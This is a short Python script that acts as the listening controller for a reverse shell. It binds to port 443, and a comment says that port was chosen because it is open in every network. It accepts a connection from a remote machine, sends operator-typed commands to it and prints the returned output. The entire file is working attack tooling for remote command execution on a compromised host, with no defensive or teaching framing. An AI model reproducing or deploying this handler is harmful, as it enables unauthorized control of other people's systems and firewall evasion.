import socket
import sys

s = socket.socket()
# Your Host IP
host = "192.168.1.15"
# Any port; using 443 because open in every network
port = 443
buffSize = 1024
s.bind((host, port))
print ('Setup at ', host)
s.listen(5)
c, addr = s.accept();
print ("Connected to ", addr)
print (c.recv(buffSize).decode("utf-8"))
print ("Shot Commands!")
run = True
while run:
    try:
        cmd = str(raw_input(">"))
        if cmd == "\n" or cmd is not None:
            c.send(cmd+'\n')
        else:
            continue
        response = c.recv(buffSize).strip().decode("utf-8")
        keepReading = True
        while keepReading:
            keepReading = '$endRes$' not in response
            if not keepReading:
                response = response.replace("$endRes$","")
            print (response)
            if keepReading:
                response = c.recv(buffSize).strip().decode("utf-8")
        if response == "bye":
            run = False
            c.close()
            sys.exit(0)
            print ("Exit!")
    except KeyboardInterrupt:
        print("handled")

